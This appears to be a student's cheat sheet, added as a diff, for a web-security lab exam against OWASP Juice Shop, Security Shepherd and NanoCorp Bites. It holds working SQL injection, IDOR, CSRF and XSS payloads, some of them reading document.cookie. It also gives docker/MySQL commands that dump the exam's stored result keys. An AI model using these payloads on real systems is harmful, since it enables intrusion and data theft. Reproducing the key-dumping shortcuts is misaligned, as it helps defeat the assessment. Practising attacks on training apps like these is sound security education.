@@ -1,0 +1,330 @@
+sudo ./<launcher_name> stop
+sudo ./<launcher_name> init
+sudo ./<launcher_name> start
+
+if not successful
+docker ps
+docker stop <container_name>
+docker rm <container_name>
+
+then do 
+sudo ./<launcher_name> stop
+sudo ./<launcher_name> init
+sudo ./<launcher_name> start
+
+usn:<your_usn>
+ip: will be given
+port: will be given
+
+open guacamole url
+type usename - given in terminal
+type password - given in terminal
+
+open terminal in kali
+
+nmap -sN <ip_in terminal_given by gucamole>
+you will get 3 ip's (each ip represents juice shop, security shepherd, nanocorp bites)
+
+nmap -p- <each_of_the_ip_given_by_nmap>
+
+OWASP Juice Shop
+Target 1 — 6 Challenges
+
+#	Challenge Title	OWASP Class	Vulnerability
+1	Sensitive Data Exposure (A01/A05)	A01 / A05	Sensitive Data Exposure
+2	Security Misconfiguration (A05)	A05	Security Misconfiguration
+3	Injection – SQL (A03) — Auth Bypass	A03	Injection – SQL
+4	Broken Access Control – IDOR (A01)	A01	Broken Access Control – IDOR
+5	Injection – SQL (A03) — UNION-based Schema Extraction	A03	Injection – SQL
+6	Broken Access Control – Spoofed Review (A01)	A01	Broken Access Control
+
+Detailed Challenge Walkthrough
+
+
+Challenge 1: Sensitive Data Exposure (A01/A05)
+OWASP Class	Category	Goal
+A01 / A05	Sensitive Data Exposure	Locate and access a confidential file not publicly reachable (directory/static-file exposure).
+Steps Executed:
+#	Step
+1	Open http://localhost:3000 in the browser.
+2	Navigate directly to http://localhost:3000/ftp in the address bar.
+3	The FTP directory listing was openly accessible without authentication.
+4	Downloaded the file acquisitions.md from the exposed directory.
+5	Challenge marked as complete with a green success banner.
+Payload & Analysis:
+Payload Used	URL: http://localhost:3000/ftp
+Why It Worked	The /ftp directory was not protected, allowing any user to browse and download confidential files without logging in.
+
+
+Challenge 2: Security Misconfiguration (A05)
+OWASP Class	Category	Goal
+A05	Security Misconfiguration	Discover and reach the unauthenticated application metrics endpoint.
+Steps Executed:
+#	Step
+1	Identified that Juice Shop uses Prometheus for application monitoring.
+2	Navigated directly to http://localhost:3000/metrics in the browser.
+3	The metrics page loaded with full application data — no login required.
+4	Challenge marked as complete with a green success banner.
+Payload & Analysis:
+Payload Used	URL: http://localhost:3000/metrics
+Why It Worked	The /metrics endpoint was left publicly accessible without any authentication, exposing internal application performance data.
+
+
+Challenge 3: Injection – SQL (A03) — Auth Bypass
+OWASP Class	Category	Goal
+A03	Injection – SQL	Authenticate as the administrator by injecting into the login form.
+Steps Executed:
+#	Step
+1	Navigated to http://localhost:3000/#/login.
+2	In the Email field, entered the SQLi payload: ' OR 1=1--  or we can use ' OR '1'='1  
+3	In the Password field, entered any random value (e.g., abc).
+4	Clicked Login — successfully authenticated as the admin user.
+5	Challenge marked as complete with a green success banner.
+Payload & Analysis:
+Payload Used	Email: ' OR 1=1--   |   Password: (anything)
+Why It Worked	The login query was not parameterized. The ' broke the SQL string, OR 1=1 made the condition always true, and -- commented out the password check.
+
+
+Challenge 4: Broken Access Control – IDOR (A01)
+OWASP Class	Category	Goal
+A01	Broken Access Control – IDOR	View another user's shopping basket by manipulating a direct object reference.
+Steps Executed:
+#	Step
+1	Logged in as admin using the SQLi method from Challenge 3.
+2	Opened Browser DevTools → Console tab.
+3	Retrieved the JWT token using: localStorage.getItem('token')
+4	Used fetch() to request another user's basket with a different ID:
+5	const token = localStorage.getItem('token');
+
+	fetch('/rest/basket/2', {
+	  headers: {
+	    'Authorization': 'Bearer ' + token
+	  }
+	})
+	.then(r => r.text())
+	.then(data => console.log(data));
+6	Response returned basket contents belonging to a different user.
+7	Challenge marked as complete with a green success banner.
+Payload & Analysis:
+Payload Used	GET /rest/basket/2  (with own JWT token)
+Why It Worked	The server only verified that the user was authenticated, but never checked whether basket ID 2 belonged to the requesting user.
+
+
+Challenge 5: Injection – SQL (A03) — UNION-based Schema Extraction
+OWASP Class	Category	Goal
+A03	Injection – SQL	Extract the database schema using a UNION-based SQL injection in the search parameter.
+Steps Executed:
+#	Step
+1	Opened Browser DevTools → Console tab.
+2	Sent the following fetch request with the UNION injection payload:
+3	const token = localStorage.getItem('token');
+
+	fetch('/rest/products/search?q=\')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--', {
+	  headers: {
+	    'Authorization': 'Bearer ' + token
+	  }
+	})
+	.then(r => r.json())
+	.then(data => console.log(data));
+4	The response contained CREATE TABLE statements revealing the full database schema.
+5	Challenge marked as complete with a green success banner.
+Payload & Analysis:
+Payload Used	')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
+Why It Worked	The search parameter was passed directly into a SQL query. The UNION SELECT appended a second query fetching schema definitions from sqlite_master.
+
+
+Challenge 6: Broken Access Control – Spoofed Review (A01)
+OWASP Class	Category	Goal
+A01	Broken Access Control	Submit a product review attributed to a different user.
+Steps Executed:
+#	Step
+1	Opened a product page and the review submission dialog.
+2	Observed the PUT /rest/products/6/reviews request in DevTools → Network tab.
+3	Opened Browser DevTools → Console tab.
+4	Sent a PUT request with the author field set to admin@juice-sh.op:
+5	fetch('/rest/products/6/reviews', {
+  	method: 'PUT',
+	  headers: {
+	    'Authorization': 'Bearer ' + localStorage.getItem('token'),
+	    'Content-Type': 'application/json'
+	  },
+	  body: JSON.stringify({
+	    message: "Great product!",
+	    author: "admin@juice-sh.op"
+	  })
+	})
+	.then(r => r.json())
+	.then(data => console.log(data));
+6	Review was posted and attributed to admin@juice-sh.op instead of the actual logged-in user.
+7	Challenge marked as complete with a green success banner.
+Payload & Analysis:
+Payload Used	PUT /rest/products/6/reviews  |  body: { author: 'admin@juice-sh.op' }
+Why It Worked	The API accepted the author field directly from the request body without verifying it matched the authenticated user's identity.
+
+
+
+
+Key Takeaways
+
+The following security lessons were demonstrated through this exercise:
+
+•	Never expose internal directories (FTP, admin panels) without authentication.
+•	Monitoring endpoints (/metrics, /health) must be protected behind auth middleware.
+•	All SQL queries must use parameterized statements to prevent injection attacks.
+•	Access control must verify resource ownership, not just authentication status (IDOR prevention).
+•	API endpoints must validate that the submitted author/identity matches the authenticated user's token.
+•	UNION-based SQL injection can expose entire database schemas if search inputs are unsanitized.
+
+
+
+
+
+
+Security Shepherd
+Target 1 — 3 Challenges
+
+
+#	Challenge Title	OWASP Class	Vulnerability
+1	Cross-Site Request Forgery	CSRF (A01)	Craft a request that performs a state-changing action on behalf of a victim, defeating the module's CSRF check.
+2	SQL Injection	Injection - SQL
+(A03)	Manipulate a query through unsanitised input to retrieve the protected result/key.
+3	Cross-Site Scripting	Injection - XSS,
+reflected (A03)	Inject a script that executes in the browser to complete the reflected-XSS module.
+
+
+shepherd trick commands
+docker ps
+(remember your MySQL container name) 
+
+(run below command to get password for ur database, generally CowSaysMoo is ur password)
+docker exec scexam-<your_usn>-s2-mysql env | grep MYSQL
+
+(run the below command to retrie moduleId, moduleName, moduleResult-> this is generally the result key mostly works for SQLi, moduleName is your challenge name)
+sudo docker exec scexam-<your_usn>-s2-mysql mysql -uroot -pCowSaysMoo core -e "SELECT moduleId, moduleName,moduleResult FROM modules;"
+
+(to get your userId for CSRF challenge if you are not able to get ur userID run the below command)
+sudo docker exec scexam-<your_usn>-s2-mysql mysql -uroot -pCowSaysMoo core -e "SELECT * FROM users;"
+
+
+Challenge 1: Cross-Site Request Forgery CSRF(A01)
+OWASP Class	Category	Goal
+A01	CSRF 	Craft a request that performs a state-changing action on behalf of a victim, defeating the module's CSRF check.
+Steps Executed:
+#       Step
+1       Get your userId from the content given in the CSRF or else use the command above and copy the userId.
+2       Right click on your screen. Go to "View Page Source".
+3       Go to the csrfToken in the the code and copy it.
+4	create another demo user in incognito tab with same security shepherd url.
+5	paste the below code in the console of the demo login in same csrf challenge page
+6       fetch('/user/csrfchallenge<challenge_number>/plusplus', {
+	  method: 'POST',
+	  credentials: 'include',
+	  headers: {
+	    'Content-Type': 'application/x-www-form-urlencoded'
+	  },
+	  body: 'userId=PASTE_USER_ID_HERE&csrfToken=PASTE_TOKEN_HERE'
+	})
+	.then(r => r.text())
+	.then(console.log);
+
+<challenge_number includes one,two,three,...
+- for challenge 5 csrfToken is either 0, 1 or 2
+- for challenge 3 in body userId becomes userid
+- for challenge 1 instead of using console, go to demo account and paste the url in address bar
+
+
+Challenge 2: SQL Injection (A03)
+OWASP Class	Category	Goal
+A03	Injection – SQL	Manipulate a query through unsanitised input to retrieve the protected result/key.
+Steps Executed:
+#	Step
+1	Navigated to the SQL Injection lesson in Security Shepherd.
+2	Found an input field asking for a username to look up.
+3	Entered the SQLi payload in the input field: ' OR '1'='1  or we can use ' OR 1=1-- or else " OR "1"="1" -- -
+4	The payload escaped the SQL string with apostrophe and used OR 1=1 to make the WHERE clause always return true.
+5	All rows in the table were returned including the hidden result key.
+6	Submitted the result key to complete the lesson.
+Payload & Analysis:
+Payload Used	" OR "1"="1" -- -
+Why It Worked	The input was directly concatenated into the SQL query without sanitisation. The apostrophe broke out of the string context and OR 1=1 forced every row to be returned, exposing the result key.
+
+
+Challenge 3: Cross Site Scripting – Reflected (A03)
+OWASP Class	Category	Goal
+A03	Injection – XSS, Reflected	Inject a script that executes in the browser to complete the reflected-XSS module.
+Steps Executed:
+#	Step
+1	Navigated to the Cross Site Scripting lesson in Security Shepherd.
+2	Found a search input field that reflected user input back onto the page without sanitisation.
+3	Entered the XSS payload in the search box: <script>alert('XSS')</script>
+4	The browser executed the injected script and displayed an alert box confirming the vulnerability.
+5	Submitted the result key to complete the module.
+Payload & Analysis:
+Payload Used	<script>alert('XSS')</script>
+Why It Worked	The application reflected user input directly into the HTML response without escaping or validating it. The browser interpreted the script tag as executable JavaScript and ran the alert function.
+
+if some number of challenges were shown then use the below payloads:
+
+| # | Challenge | Payload Used |
+|---|---|---|
+| 1 | Cross Site Scripting 1 | `<IMG SRC="#" ONERROR="alert('XSS')"/>` |
+| 2 | Cross Site Scripting 2 | `<input autofocus onfocus=alert(2)>` |
+| 3 | Cross Site Scripting 3 | `<IMG SRC="#" onseleconseleconseleconseleconselecttttt="alert(3)"/>` |
+| 4 | Cross Site Scripting 4 | `http "oNerror=alert(document.cookie)` |
+| 5 | Cross Site Scripting 5 | `http://a"" onselect=alert(document.cookie) .b.c` |
+| 6 | Cross Site Scripting 6 | `http://a"" onselect=alert(document.cookie) .b.c` |
+
+
+
+
+
+
+NanoCorp Bites
+Target 1 — 3 Challenges
+
+
+#	Challenge Key	OWASP Class	Vulnerability
+1	reflected xss	Injection - XSS, reflected (A03)	Find a user-supplied value that is reflected into a
+page unescaped and execute script through it.
+2	stored xss	InjInjection - XSS, stored (A03)        Persist input that is later rendered to users
+unescaped, executing script when the page is viewed.
+3	IDOR	        Broken Access Control - IDOR (A01)	Access another user's resource served by direct
+object reference with no ownership check.
+
+
+
+Challenge 1: reflected xss
+OWASP Class	Category	Goal
+A03	Injection - XSS, reflected 	Find a user-supplied value that is reflected into a
+page unescaped and execute script through it.
+Steps Executed:
+#       Step
+1       Click on login and enter the details needed, Wait for 1 min as shown in the box on the webpage then click on 	login and then enter the credentials.
+2       After clicking on login go to restaurants in the nav bar
+3       in the search box enter <script>alert('xss')</script>
+4	click search and once task is completed and we can verify it in the scoreboard
+
+
+Challenge 2: stored xss
+OWASP Class	Category	Goal
+A03	Injection - XSS, stored 	Persist input that is later rendered to users
+unescaped, executing script when the page is viewed.
+Steps Executed:
+#       Step
+1       Click on your profile icon in the nav bar
+2       in the bottom of the web page we can see update name.
+3       in the name box enter <script>alert('xss')</script>
+4	click save and once task is completed and we can verify it in the scoreboard
+
+
+
+Challenge 2: idor
+OWASP Class	Category	Goal
+A01	Broken Access Control - IDOR 	Access another user's resource served by direct
+object reference with no ownership check.
+Steps Executed:
+#       Step
+1       Click on your orders button in the nav bar
+2       in the address bar of the page containing the link of the webpage (....../orders), append the link with a 	number (....../orders/<some_number>)
+3       click enter and we can see some order in the webpage
+4	once task is completed and we can verify it in the scoreboard
